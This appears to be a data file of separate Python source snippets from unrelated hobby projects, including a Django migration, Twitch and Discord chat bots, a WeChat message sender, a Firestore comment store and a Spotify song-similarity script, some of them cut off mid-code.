    "# Generated by Django 5.0.4 on 2024-05-19 11:25\n\nimport django.core.validators\nimport django.db.models.deletion\nimport species_data.fields\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('species_data', '0015_alter_sourcetype_name'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='speciesproperties',\n            name='sun_hours_confidence',\n            field=species_data.fields.ConfidenceField(blank=True, decimal_places=1, max_digits=2, null=True, validators=[django.core.validators.MinValueValidator(0.0), django.core.validators.MaxValueValidator(1.0)], verbose_name='%(parent_verbose_name)s confidence'),\n        ),\n        migrations.AddField(\n            model_name='speciesproperties',\n            name='sun_hours_maximum',\n            field=models.DurationField(blank=True, null=True, verbose_name='%(parent_verbose_name)s maximum'),\n        ),\n        migrations.AddField(\n            model_name='speciesproperties',\n            name='sun_hours_minimum',\n            field=models.DurationField(blank=True, null=True, verbose_name='%(parent_verbose_name)s minimum'),\n        ),\n        migrations.AddField(\n            model_name='speciesproperties',\n            name='sun_hours_source',\n            field=species_data.fields.SourceField(blank=True, null=True, on_delete=django.db.models.deletion.CASCADE, related_name='+', to='species_data.source', verbose_name='%(parent_verbose_name)s source'),\n        ),\n        migrations.AddField(\n            model_name='speciesproperties',\n            name='sun_hours_typical',\n            field=models.DurationField(blank=True, null=True, verbose_name='%(parent_verbose_name)s typical'),\n        ),\n    ]\n",
    "import os\nimport numpy as np\nimport librosa\nimport soundfile as sf\nfrom pydub import AudioSegment\nfrom pydub.silence import split_on_silence\nfrom pydub.playback import play\nfrom tqdm import tqdm\n\ndef clean_audio(audio_path, output_path, selected_chunks, min_silence_len=1000, silence_thresh=-40, keep_silence=100):\n    # Load the audio file\n    audio_segment = AudioSegment.from_file(audio_path)\n\n    # Convert to mono\n    audio_segment = audio_segment.set_channels(1)\n\n    # Normalize the audio\n    audio_segment = normalize_audio(audio_segment)\n\n    # Split on silence\n    chunks = split_on_silence(\n        audio_segment,\n        min_silence_len=min_silence_len,\n        silence_thresh=silence_thresh,\n        keep_silence=keep_silence,\n    )\n\n    # Find the main speaker based on total duration\n    main_speaker_chunk = max(chunks, key=lambda chunk: len(chunk))\n\n    # Apply EQ and compression\n    main_speaker_chunk = apply_eq_and_compression(main_speaker_chunk)\n\n    # Export the main speaker's audio\n    main_speaker_chunk.export(output_path, format=\"wav\")\n\ndef normalize_audio(audio_segment):\n    \"\"\"\n    Normalizes the audio to a target volume.\n    \"\"\"\n    target_dBFS = -20\n    change_in_dBFS = target_dBFS - audio_segment.dBFS\n    return audio_segment.apply_gain(change_in_dBFS)\n\ndef apply_eq_and_compression(audio_segment):\n    \"\"\"\n    Applies equalization and compression to the audio.\n    \"\"\"\n    # Apply EQ\n    audio_segment = audio_segment.high_pass_filter(80)\n    audio_segment = audio_segment.low_pass_filter(12000)\n\n    # Apply compression\n    threshold = -20\n    ratio = 2\n    attack = 10\n    release = 100\n    audio_segment = audio_segment.compress_dynamic_range(\n        threshold=threshold,\n        ratio=ratio,\n        attack=attack,\n        release=release,\n    )\n\n    return audio_segment\n\ndef process_file(wav_file, srt_file, cleaned_folder):\n    print(f\"Processing file: {wav_file}\")\n\n    # Create the cleaned folder if it doesn't exist\n    os.makedirs(cleaned_folder, exist_ok=True)\n\n    input_wav_path = wav_file\n    output_wav_path = os.path.join(cleaned_folder, os.path.basename(wav_file))\n\n    # Review and select desired SRT chunks\n    selected_chunks = review_srt_chunks(input_wav_path, srt_file)\n\n    # Clean the audio based on selected chunks\n    clean_audio(input_wav_path, output_wav_path, selected_chunks)\n\n    print(f\"Cleaned audio saved to: {output_wav_path}\")\n\ndef review_srt_chunks(audio_path, srt_path):\n    audio_segment = AudioSegment.from_wav(audio_path)\n    selected_chunks = []\n\n    with open(srt_path, \"r\") as srt_file:\n        srt_content = srt_file.read()\n        srt_entries = srt_content.strip().split(\"\\n\\n\")\n\n        for entry in tqdm(srt_entries, desc=\"Reviewing SRT chunks\", unit=\"chunk\"):\n            lines = entry.strip().split(\"\\n\")\n            if len(lines) >= 3:\n                start_time, end_time = lines[1].split(\" --> \")\n                start_time = convert_to_milliseconds(start_time)\n                end_time = convert_to_milliseconds(end_time)\n\n                chunk = audio_segment[start_time:end_time]\n                print(\"Playing chunk...\")\n                play(chunk)\n\n                choice = input(\"Keep this chunk? (y/n): \")\n                if choice.lower() == \"y\":\n                    selected_chunks.append((start_time, end_time))\n                    print(\"Chunk selected.\")\n                else:\n                    print(\"Chunk skipped.\")\n\n    return selected_chunks\n\ndef convert_to_milliseconds(time_str):\n    time_str = time_str.replace(\",\", \".\")\n    hours, minutes, seconds = time_str.strip().split(\":\")\n    milliseconds = (int(hours) * 3600 + int(minutes) * 60 + float(seconds)) * 1000\n    return int(milliseconds)\n\n# Set the WAV file, SRT file, and cleaned folder paths\nwav_file = \"/path/to/your/audio.wav\"\nsrt_file = \"/path/to/your/subtitles.srt\"\ncleaned_folder = \"/path/to/cleaned/folder\"\n\n# Process the WAV file\nprocess_file(wav_file, srt_file, cleaned_folder)\n\nprint(\"Processing completed.\")\n",
    "from enum import Enum\nfrom db.userDB import Usuario\nimport discord\nimport inspect\nfrom discord.ext import commands\nfrom db.channelDB import ChannelDB\n\n# This class is responsible for handling the prices of the commands.\n\nclass Prices(Enum):\n    points = 0\n    leaderboard = 0\n    cassino = 0\n    speak = 0\n    donatePoints = 0\n    shop = 0\n    salario = 0\n    balls = 50\n    love = 75\n    mog = 100\n    mute = 150\n    unmute = 150\n    deafen = 150\n    undeafen = 150\n    disconnect = 175\n    changeNickname = 200\n    fling = 200\n    purge = 250\n    radinho = 325\n    fish = 325\n    stealPoints = 350\n    pardon = 500\n    emergency = 500\n    tirarRadinho = 500\n    momentOfSilence = 500\n    lowWageRole = 650\n    implode = 750\n    explode = 850\n    kick = 850\n    detonate = 880\n    shuffle = 900\n    prison = 900\n    lowClassRole = 920\n    ban = 950\n    god = 1000\n    middleClassRole = 1200\n    highClassRole = 1600\n    nuke = 50000\n\ndef verificar_pontos(User: discord.Member, comando):\n    price = Prices[comando].value\n    user_data = Usuario.read(User.id)\n    if user_data:\n        return user_data[\"points\"] >= price\n    else:\n        return False\n\nasync def refund(User: discord.Member, ctx):\n    try:\n        price = Prices[ctx.command.name].value\n        await Usuario.update(User.id, Usuario.read(User.id)[\"points\"] + price, Usuario.read(User.id)[\"roles\"])\n    except Exception as e:\n        print(\"Error encountered while refunding the money.\", e)\n\nasync def treat_exceptions(ctx, comando):\n        \n    message_content = ctx.message.content\n    command_args = message_content.split()[1:]  \n        \n    command_func = ctx.command.callback\n    parameters = list(inspect.signature(command_func).parameters.values())\n    parameters = parameters[2:]  \n    \n    optional_params_indices = [i for i, param in enumerate(parameters) if param.default != inspect.Parameter.empty]\n    varargs_index = next((i for i, param in enumerate(parameters) if param.kind == param.VAR_POSITIONAL), None)\n    \n    expected_args_count = len(parameters) - len(optional_params_indices)\n    if varargs_index is not None:\n        expected_args_count -= 1 \n    \n    if len(command_args) < expected_args_count:\n        await ctx.send(\"Insufficient amount of arguments.\")\n        return False\n    elif len(command_args) > len(parameters) and varargs_index is None:\n        await ctx.send(\"Excessive amount of arguments.\")\n        return False\n    \n    channel_list = ChannelDB.readAll() \n    channels = []\n    for channel_dic in channel_list:\n        channel = ctx.bot.get_channel(channel_dic[\"channel_id\"])\n        channels.append(channel)\n    \n    if ctx.channel not in channels:\n        await ctx.send(\"You are not allowed to use commands in this channel.\")\n        return False\n    \n    i = 0\n    for index, param in enumerate(parameters):\n        param_type = param.annotation\n        if param_type is inspect.Parameter.empty:\n            continue\n        try:\n            if varargs_index is not None and index >= varargs_index:\n                arg = ' '.join(command_args[i:])\n                command_args = command_args[:i]\n            else:\n                arg = command_args[i] if i < len(command_args) else param.default \n            if arg is not None: \n                if param_type == discord.Member:\n                    arg = await commands.MemberConverter().convert(ctx, arg)\n                else:\n                    arg = param_type(arg)\n            if arg is not None and not isinstance(arg, param_type):\n                await ctx.send(\"Invalid arguments.\")\n                return False\n            if '*' not in str(param) and index not in optional_params_indices:\n                i += 1\n        except ValueError:\n            await ctx.send(\"Invalid arguments.\")\n            return False\n        except commands.MemberNotFound:\n            await ctx.send(\"Member not found.\")\n            return False\n        except commands.errors.BadArgument:\n            await ctx.send(\"Invalid arguments.\")\n            return False\n        except commands.errors.MissingPermissions:\n            await ctx.send(\"Insufficient permissions.\")\n            return False\n        except commands.errors.BotMissingPermissions:\n            await ctx.send(\"Bot has insufficient permissions.\")\n            return False\n        except commands.errors.CommandInvokeError:\n            await ctx.send(\"An error occurred while executing the command.\")\n            return False\n\n    new_points = Usuario.read(ctx.author.id)[\"points\"] - Prices[comando].value\n    Usuario.update(ctx.author.id, new_points, Usuario.read(ctx.author.id)[\"roles\"])\n    return True\n\ndef pricing():\n    async def predicate(ctx):\n        comando = ctx.command.name        \n        if comando in Prices.__members__:\n            if verificar_pontos(ctx.author, comando):\n                return await treat_exceptions(ctx,comando)\n            else:\n                await ctx.send(\"You dont have enough points to use this command.\")\n                return False",
    "# -*- coding: utf-8 -*-\n# @Author: xhf\n# @Date:   2024.4.1\n\nimport requests\nimport json\nimport os\n\nconfig_path = os.path.join(os.path.dirname(__file__), \"config.json\")\n\n# \u4ececonfig.json\u4e2d\u8bfb\u53d6\u914d\u7f6e\u4fe1\u606f\ndef read_config():\n    \"\"\"\n       \u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u5e76\u8fd4\u56de\u914d\u7f6e\u5185\u5bb9\u3002\n\n       Returns:\n           dict: \u5305\u542b\u914d\u7f6e\u4fe1\u606f\u7684\u5b57\u5178\u5bf9\u8c61\uff0c\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\u6216\u89e3\u6790\u5931\u8d25\uff0c\u5219\u8fd4\u56de\u7a7a\u5b57\u5178\u3002\n       \"\"\"\n    with open(config_path, 'r', encoding='utf-8') as file:\n        return json.load(file)\n\ndef updata_config():\n    \"\"\"\n       \u5c06\u914d\u7f6e\u4fe1\u606f\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002\n\n       Args:\n           config_path (str): \u914d\u7f6e\u6587\u4ef6\u8def\u5f84\u3002\n       \"\"\"\n    with open(config_path, 'w', encoding='utf-8') as file:\n        json.dump(config, file, indent=4, ensure_ascii=False)\n\nconfig = read_config()\n\n# \u4ece\u5fae\u4fe1 API \u83b7\u53d6\u8bbf\u95ee\u4ee4\u724c\u7684\u51fd\u6570\ndef get_stable_token(AppID=config[\"wechat\"][\"AppID\"], AppSecret=config[\"wechat\"][\"AppSecret\"]):\n    \"\"\"\n            \u83b7\u53d6\u5fae\u4fe1 access_token\u3002\n\n            Args:\n                AppID (str): \u5fae\u4fe1\u5e94\u7528\u7684 AppID\u3002\n                AppSecret (str): \u5fae\u4fe1\u5e94\u7528\u7684 AppSecret\u3002\n\n            Returns:\n                str: \u83b7\u53d6\u5230\u7684 access_token\u3002\n            \"\"\"\n    url = \"https://api.weixin.qq.com/cgi-bin/stable_token?\"\n    data = \\\n        {\n            \"grant_type\": \"client_credential\",\n            \"appid\": AppID,\n            \"secret\": AppSecret\n        }\n    data = json.dumps(data)\n    response = requests.post(url, data=data)\n\n    res = response.json()\n    print(res)\n    # \u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\n    access_token = res[\"access_token\"]\n    config[\"wechat\"][\"access_token\"] = access_token\n\n    updata_config()\n    return access_token\n\n\n# \u53d1\u9001\u6d88\u606f\ndef send_message(touser, token, info=None, rainbow_text=None):\n    \"\"\"\n        \u53d1\u9001\u6d88\u606f\u3002\n        Args:\n            touser (str): \u63a5\u6536\u6d88\u606f\u7684\u7528\u6237 openid\u3002\n            token (str): \u5fae\u4fe1 access_token\u3002\n            info (dict): \u5305\u542b\u5929\u6c14\u4fe1\u606f\u7684\u5b57\u5178\u3002\n            rainbow_text (str): \u5f69\u8679\u5c41\u6587\u672c\u3002\n    \"\"\"\n    url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={0}'.format(token)\n    data = {\n        \"touser\": touser,\n        \"template_id\": config[\"template\"][\"template_id\"],\n        # \"url\": info['link'],\n        \"topcolor\": \"#FF0000\",\n        \"data\": {\n            \"date\": {\n                \"value\": \"\u4f60\u597d\",\n                \"color\": \"#000\"\n            },\n            \"city\": {\n                \"value\": \"\u6ca1\u95ee\u9898\",\n                \"color\": \"#000\"\n            },\n            \"weather_now\": {\n                \"value\": \"\u6211\u7684\u6d4b\u8bd5\",\n                \"color\": \"#000\"\n            },\n            \"temprature_now\": {\n                \"value\": \"\u592a\u591a\u4e86\u5427\",\n                \"color\": \"#000\"\n            },\n            \"temprature_today\": {\n                \"value\": \"\u5566\u5566\u5566\u5566\",\n                \"color\": \"#000\"\n            },\n            \"win\": {\n                \"value\": \"sdfsf\",\n                \"color\": \"#000\"\n            },\n            \"rainbow\": {\n                \"value\": \"sfsdf\",\n                \"color\": \"#000\"\n            }\n        }\n    }\n    response = requests.post(url=url, data=json.dumps(data))\n    if response.json()['errmsg'] == 'ok':\n        print('\\033[91m' + '\u63a8\u9001\u6210\u529f' + '\\033[0m')  # \u8f93\u51fa\u7ea2\u8272\u6587\u5b57\n    else:\n        print('\\033[91m' + '\u63a8\u9001\u5931\u8d25' + '\\033[0m')  # \u8f93\u51fa\u7ea2\u8272\u6587\u5b57\n\n\nif __name__ == '__main__':\n    token = get_stable_token(config[\"wechat\"][\"AppID\"], config[\"wechat\"][\"AppSecret\"])\n    # \u8981\u63a8\u9001\u7684\u7528\u6237\n    touser = config[\"template\"][\"touser\"][0]\n    send_message(touser, token)",
    "import os\nimport json\nimport csv\nimport re\nimport sys\nfrom twitchio.ext import commands\nfrom twitchio.ext import routines\nimport deepl \n\nCLIENT_ID = ''\nCLIENT_SECRET = ''\nACCESS_TOKEN = ''\nREFRESH_TOKEN = ''\nAUTH_KEY = ''\nSOURCE_LANGUAGE = ''\nTARGET_LANGUAGE = ''\nCHANNEL_URL = ''\n\nclass Bot(commands.Bot):\n    def __init__(self):\n        super().__init__(token=ACCESS_TOKEN, prefix='!', initial_channels=[CHANNEL_URL])\n\n    async def event_ready(self):\n        # Bot says 'None' first, when no routine is set\n        print(f'\\nLogged in as: {self.nick}')\n        print(f'Now trying to post test message in channel: {self.nick}')\n        await self.get_channel(CHANNEL_URL).send('Translation-Bot is ready! SeriousSloth')\n    \n    async def event_message(self, message):\n        if message.echo:\n            return\n        await self.handle_commands(message)\n        if message.content[:3] == '!ja':\n            return\n        translation_result = translate(message.content, SOURCE_LANGUAGE, TARGET_LANGUAGE)        \n        if translation_result:\n            await message.channel.send(f'{message.author.name}: {translation_result}')\n        \n    async def event_command_error(self, context: commands.Context, error: Exception):\n        if isinstance(error, commands.CommandNotFound):\n            return\n        print(error)\n\n    @commands.command()\n    async def ja(self, ctx: commands.Context, *, phrase: str):\n        translation_result = reverse_translate(phrase, TARGET_LANGUAGE, 'JA')\n        if translation_result:\n            await ctx.send(f'{ctx.author.name}: {translation_result}')\n\n    @routines.routine(seconds=900.0)\n    async def check_access_token():\n        if not is_access_token_valid():    \n            refresh_access_token()    \n\ndef read_credentials():\n    found_config = False\n    while not found_config:\n        try:\n            f = open('config.csv')\n        except FileNotFoundError:\n            input('Your config.csv couldn\\'t be found. Press enter to let the script try again.')\n        else:\n            with f:\n                csv_reader = csv.reader(f, delimiter=',')\n                for i, row in enumerate(csv_reader):\n                    if i == 1:\n                        globals()['CLIENT_ID'] = row[0]\n                        globals()['CLIENT_SECRET'] = row[1]\n                        globals()['ACCESS_TOKEN'] = row[2]\n                        globals()['REFRESH_TOKEN'] = row[3]\n                        globals()['AUTH_KEY'] = row[4]\n                        globals()['SOURCE_LANGUAGE'] = row[5]\n                        globals()['TARGET_LANGUAGE'] = row[6]\n                        globals()['CHANNEL_URL'] = row[7]\n            print('CSV-File successfully found.')\n            found_config = True\n\ndef write_credentials():\n    with open('config.csv', 'w', newline='') as f:\n        writer = csv.writer(f)\n        writer.writerow(['CLIENT_ID', 'CLIENT_SECRET', 'ACCESS_TOKEN', 'REFRESH_TOKEN', 'AUTH_KEY', 'SOURCE_LANGUAGE', 'TARGET_LANGUAGE', 'CHANNEL_URL'])\n        writer.writerow([CLIENT_ID, CLIENT_SECRET, ACCESS_TOKEN, REFRESH_TOKEN, AUTH_KEY, SOURCE_LANGUAGE, TARGET_LANGUAGE, CHANNEL_URL])\n    print('Successfully refreshed credentials.')\n\ndef is_access_token_valid():\n    validation_result = os.popen(f\"curl -s -X GET \\\"https://id.twitch.tv/oauth2/validate\\\" -H \\\"Authorization: OAuth {ACCESS_TOKEN}\\\"\").read()\n    parsed_validation_result = json.loads(validation_result)\n    if 'expires_in' in parsed_validation_result:\n        if parsed_validation_result['expires_in'] > 2400:\n            return True\n        else:\n            return False\n    else:        \n        print('Access Token has expired (or has no expiration value).')\n        return False\n\ndef refresh_access_token():\n    print('Attempting to request new tokens ...')\n    refresh_request_result = os.popen(f\"curl -s -X POST \\\"https://id.twitch.tv/oauth2/token\\\" -H \\\"Content-Type: application/x-www-form-urlencoded\\\" -d \\\"grant_type=refresh_token&refresh_token={REFRESH_TOKEN}&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}\\\"\").read()\n    parsed_refresh_request_result = json.loads(refresh_request_result)\n    if 'access_token' in parsed_refresh_request_result:\n        globals()['ACCESS_TOKEN'] = parsed_refresh_request_result['access_token']\n        globals()['REFRESH_TOKEN'] = parsed_refresh_request_result['refresh_token']\n        write_credentials()\n    else:\n        input('Couldn\\'t refresh Access Token. Check Refresh Token. Pressing enter will close the script.')\n        sys.exit()\n\ndef translate(source_text, source_l, target_l):\n    if source_l == 'JA':\n        source_text_cleaned = re.sub(r'[^\\u3000-\\u303f\\u3040-\\u309f\\u30a0-\\u30ff\\uff00-\\uff9f\\u4e00-\\u9faf\\u3400-\\u4dbf]', '', source_text)\n    else:\n        source_text_cleaned = source_text\n    if source_text_cleaned:\n        # DeepL-API recognizes only EN as source-value, no EN-US or EN-GB\n        result = TRANSLATOR.translate_text(source_text, source_lang=source_l[:2], target_lang=target_l)\n        return re",
    "from odoo import models\n\n\nclass StockMove(models.Model):\n\n    _inherit = 'stock.move'\n\n    def _split(self, qty, restrict_partner_id=False):\n        if not self._context.get('mrp_record_production'):\n            return super(StockMove, self)._split(qty, restrict_partner_id)\n\n        amls = self.move_line_ids.filtered(\n            lambda aml: aml.qty_done > 0 and\n            aml.product_uom_qty > aml.qty_done)\n        aml_vals = []\n        for aml in amls:\n            vals = {\n                'product_id': aml.product_id.id,\n                'product_uom_qty': aml.product_uom_qty - aml.qty_done,\n                'product_uom_id': aml.product_uom_id.id,\n                'workorder_id': aml.workorder_id.id,\n                'location_id': aml.location_id.id,\n                'location_dest_id': aml.location_dest_id.id,\n                'picking_id': aml.picking_id.id,\n                'lot_id': aml.lot_id.id or False,\n                'package_id': aml.package_id.id or False,\n                'owner_id': aml.owner_id.id or False,\n            }\n            aml_vals.append(vals)\n        new_move_id = super(StockMove, self)._split(qty, restrict_partner_id)\n        for vals in aml_vals:\n            vals['move_id'] = new_move_id\n            self.env['stock.move.line'].create(vals)\n        self.browse(new_move_id)._recompute_state()\n        return new_move_id\n",
    "import time\nfrom datetime import datetime\n\n# Firebase \uad00\ub828 \ud328\ud0a4\uc9c0\nimport firebase_admin\nfrom firebase_admin import credentials, firestore\nfrom google.cloud.firestore_v1.base_query import FieldFilter\n\ncred = credentials.Certificate('authentication/firebase_auth.json')\nfirebase_admin.initialize_app(cred)\nITEM_PER_PAGE = 5\n\n\nclass Database:\n    @classmethod\n    def __init__(cls):\n        pass\n\n    @classmethod\n    def get_userinfo(cls):\n        db = cls.__connection()\n        return db.collection('UserInfo')\n\n    @classmethod\n    def get_contentinfo(cls):\n        db = cls.__connection()\n        return db.collection('ContentInfo')\n\n    @classmethod\n    def content_select(cls, contentinfo_id):\n        db = cls.__connection()\n        return db.collection(\"ContentInfo\").document(contentinfo_id).get()\n\n    @classmethod\n    def comment_select(cls, contentinfo_id):\n        db = cls.__connection()\n        data = db.collection(\"CommentInfo\").where(\n            filter=FieldFilter(\"contentinfo_id\", \"==\", contentinfo_id)\n        ).where(\n            filter=FieldFilter(\"is_visible\", \"==\", True)\n        ).order_by(\"cm_create_date\").limit(ITEM_PER_PAGE)\n        docs = data.get()\n        if len(docs) == ITEM_PER_PAGE:\n            last = docs[-1].to_dict()[\"cm_create_date\"]\n        else:\n            last = None\n        return data.stream(), last\n\n    @classmethod\n    def comment_select_more(cls, contentinfo_id, cursor):\n        db = cls.__connection()\n        data = db.collection(\"CommentInfo\").where(\n            filter=FieldFilter(\"contentinfo_id\", \"==\", contentinfo_id)\n        ).where(\n            filter=FieldFilter(\"is_visible\", \"==\", True)\n        ).order_by(\"cm_create_date\").limit(ITEM_PER_PAGE).start_after({\"cm_create_date\": cursor})\n        docs = data.get()\n        if len(docs) == ITEM_PER_PAGE:\n            last = docs[-1].to_dict()[\"cm_create_date\"]\n        else:\n            last = None\n        return data.stream(), last\n\n    @classmethod\n    def comment_insert(cls, data: dict):\n        table = cls.__connection().collection(\"CommentInfo\")\n        num = int(table.count().get()[0][0].value) + 1\n        curr_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        table.add(\n            document_data={\n                \"contentinfo_id\": data[\"contentinfo_id\"],\n                \"userinfo_id\": data[\"userinfo_id\"],\n                \"comment\": data[\"comment\"],\n                \"is_visible\": True,\n                \"cm_create_date\": curr_time,\n                \"cm_update_date\": curr_time\n            },\n            document_id=str(num)\n        )\n\n    @classmethod\n    def comment_edit(cls, data: dict, doc_id: str):\n        table = cls.__connection().collection(\"CommentInfo\")\n        curr_time = datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n        target = table.document(doc_id)\n        if \"is_visible\" in data.keys():\n            target.update({\n                \"is_visible\": data[\"is_visible\"],\n                \"cm_update_date\": curr_time\n            })\n        else:\n            target.update({\n                \"comment\": data[\"comment\"],\n                \"cm_update_date\": curr_time\n            })\n            return curr_time\n\n    @classmethod\n    def __connection(cls, retry_count=5):\n        for try_num in range(retry_count + 1):\n            try:\n                db = firestore.client()\n            except Exception as e:\n                print(\"[Error: DB Connection] \", e)\n                pass\n            else:\n                return db\n            if try_num == 5:\n                print(\"Connection will stop.\")\n                return None\n            time.sleep(2 ** try_num)\n            print(f\"RETRY CONNECTION... {try_num + 1}th try\")\n            continue\n\n\nif __name__ == \"__main__\":\n    # Database.comment_insert(data={})\n    rows, c = Database.comment_select(\"1\")\n    for row in rows:\n        print(row.id, row.to_dict())\n    # print(Database.content_select(\"f15ruAbukPXoMihgbfx8\").to_dict())\n",
    "from socket import socket\r\nimport re, os\r\n\r\ntry:\r\n    import yaml\r\n    from easygoogletranslate import EasyGoogleTranslate\r\n    import pyttsx3\r\n    from colorama import Fore\r\nexcept ModuleNotFoundError:\r\n    print(\"You are missing some Modules.. let me fix that.\")\r\n    os.system(\"pip install PyYAML easygoogletranslate pyttsx3 colorama\")\r\n    print(\"Finished installing Modules. Rerun the program.\")\r\n    \r\n# Needed for the Colors in Terminal (for windows atleast)\r\nos.system(\"color\")\r\n\r\n# Setup Translate\r\ngoogleTranslate = EasyGoogleTranslate()\r\n\r\n# Setup TTS\r\nengine = pyttsx3.init()\r\nengine.setProperty('voice', engine.getProperty('voices')[1].id)\r\n\r\n# Load Config Values\r\nwith open('config.yml', 'r') as file:\r\n    config = yaml.safe_load(file)\r\n    \r\n    server = config['server']\r\n    port = config['port']\r\n    nickname = config['nickname']\r\n    token = config['oauth']\r\n    channels = config['channels']\r\n    language = config['language']\r\n    tts = config['tts']\r\n    bot_check = config['bot_check']\r\n    bot_users = config['bot_users']\r\n\r\n\r\nsock = socket()\r\nsock.connect((server, port))\r\n\r\n# Provide Nickname and Oauth to Twitch so we can read the messages.\r\nsock.send(f\"PASS {token}\\n\".encode('utf-8'))\r\nsock.send(f\"NICK {nickname}\\n\".encode('utf-8'))\r\n\r\n# Join all Channels from the config\r\nfor channel in channels:\r\n    sock.send(f\"JOIN #{channel}\\n\".encode('utf-8'))\r\n\r\nwhile True:\r\n        resp = sock.recv(2048).decode('utf-8')\r\n\r\n        if resp.startswith('PING'):\r\n            sock.send(\"PONG\\n\".encode('utf-8'))\r\n        \r\n        elif len(resp) > 0:\r\n            if resp.startswith('PING'):\r\n                sock.send(\"PONG\\n\".encode('utf-8'))\r\n                \r\n            elif len(resp) > 0 and 'PRIVMSG' in resp:\r\n                    match = re.search(r':([^!]+)![^@]+@[^ ]+\\.tmi\\.twitch\\.tv PRIVMSG #([^ ]+) :(.+)', resp)\r\n                    if match:\r\n                        username, channel, message = match.groups()\r\n                        \r\n                        # Check if Message is not an Command\r\n                        if not message.startswith(\"!\"):\r\n                            translated_message = googleTranslate.translate(text=message, target_language=language)\r\n\r\n                        # TODO make this configurable\r\n                        print(f\"{Fore.CYAN} {channel} {Fore.RED} {username}{Fore.LIGHTBLUE_EX}: {Fore.WHITE}{translated_message} | {message}\")\r\n                        \r\n                        # Check if TTS is enabled and user is not a Bot.\r\n                        if tts:\r\n                            \r\n                            # ass code but i couldnt care less\r\n                            \r\n                            if bot_check:\r\n                                if not username in bot_users:\r\n                                    engine.say(f\"{channel}: {translated_message}\")\r\n                                    engine.runAndWait()\r\n                            else:\r\n                                engine.say(f\"{channel}: {translated_message}\")\r\n                                engine.runAndWait()",
    "# Project conception 03/31/2024\n# Project started 04/02/2024\n\nimport pandas as pd\nimport time\n\n# Read the CSV file\ndf = pd.read_csv(\"spotify_songs.csv\")\n\n# Convert each column into an array\ntrack_id = df['track_id'].values\ntrack_name = df['track_name'].values\ntrack_artist = df['track_artist'].values\ntrack_popularity = df['track_popularity'].values\ntrack_album_id = df['track_album_id'].values\ntrack_album_name = df['track_album_name'].values\ntrack_album_release_date = df['track_album_release_date'].values\nplaylist_name = df['playlist_name'].values\nplaylist_id = df['playlist_id'].values\nplaylist_genre = df['playlist_genre'].values\nplaylist_subgenre = df['playlist_subgenre'].values\ndanceability = df['danceability'].values\nenergy = df['energy'].values\nkey = df['key'].values\nloudness = df['loudness'].values\nmode = df['mode'].values\nspeechiness = df['speechiness'].values\nacousticness = df['acousticness'].values\ninstrumentalness = df['instrumentalness'].values\nliveness = df['liveness'].values\nvalence = df['valence'].values\ntempo = df['tempo'].values\nduration_ms = df['duration_ms'].values\n\n\ndef print_info(song_index):\n    print(\"Track ID:\", track_id[song_index])\n    print(\"Track name:\", track_name[song_index])\n    print(\"Track artist:\", track_artist[song_index])\n    print(\"Track popularity:\", track_popularity[song_index])\n    print(\"Track album ID:\", track_album_id[song_index])\n    print(\"Track album name:\", track_album_name[song_index])\n    print(\"Track album release date:\", track_album_release_date[song_index])\n    print(\"Playlist name:\", playlist_name[song_index])\n    print(\"Playlist ID:\", playlist_id[song_index])\n    print(\"Playlist genre:\", playlist_genre[song_index])\n    print(\"Playlist subgenre:\", playlist_subgenre[song_index])\n    print(\"Danceability:\", danceability[song_index])\n    print(\"Energy:\", energy[song_index])\n    print(\"Key:\", key[song_index])\n    print(\"Loudness:\", loudness[song_index])\n    print(\"Mode:\", mode[song_index])\n    print(\"Speechiness:\", speechiness[song_index])\n    print(\"Acousticness:\", acousticness[song_index])\n    print(\"Instrumentalness:\", instrumentalness[song_index])\n    print(\"Liveness:\", liveness[song_index])\n    print(\"Valence:\", valence[song_index])\n    print(\"Tempo:\", tempo[song_index])\n    print(\"Duration (ms):\", duration_ms[song_index])\n\n\nprint_info(6236)\n\n\ndef similar_song(song_index, num_similar):\n    num_songs = len(track_id)\n    similarity_scores = num_songs * [0]\n\n    print(\"Track ID:\")\n\n    for i in range(num_songs):\n\n        ''' track_id '''\n        this_id = track_id[song_index]\n        other_id = track_id[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' track_name '''\n        this_name = track_name[song_index]\n        other_name = track_name[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' track_artist '''\n        this_artist = track_artist[song_index]\n        other_artist = track_artist[i]\n\n        similarity_scores[i] += 5 if this_artist == other_artist else 0\n\n        ''' track_popularity '''\n        this_popularity = track_popularity[song_index]\n        other_popularity = track_popularity[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        '''track_album_id '''\n        this_album_id = track_album_id[song_index]\n        other_album_id = track_album_id[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' track_album_name '''\n        this_album_name = track_album_name[song_index]\n        other_album_name = track_album_name[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' track_album_release_date '''\n        this_album_release_date = track_album_release_date[song_index]\n        other_album_release_date = track_album_release_date[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' playlist_name '''\n        this_playlist_name = playlist_name[song_index]\n        other_playlist_name = playlist_name[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' playlist_id '''\n        this_playlist_id = playlist_id[song_index]\n        other_playlist_id = playlist_id[i]\n\n        # TODO: Create method for adjusting similarity score\n        similarity_scores[i] += 0\n\n        ''' playlist_genre '''\n\n        this_playlist_genre = playlist_genre[song_index]\n        other_playlist_genre = playlist_genre[i]\n\n        similarity_scores[i] += 2 if this_playlist_genre == other_playlist_genre else 0\n\n        ''' playlist_subgenre '''\n        this_playlist_subgenre = playlist_subgenre[song_index]\n        other_playlist_subgenre = playlist_subgenre[i]\n\n        similarity_scores[i] += .5 if this_playlist_subgenre == other_playlist_subgenre else 0\n\n        ''' danceability '''\n   ",
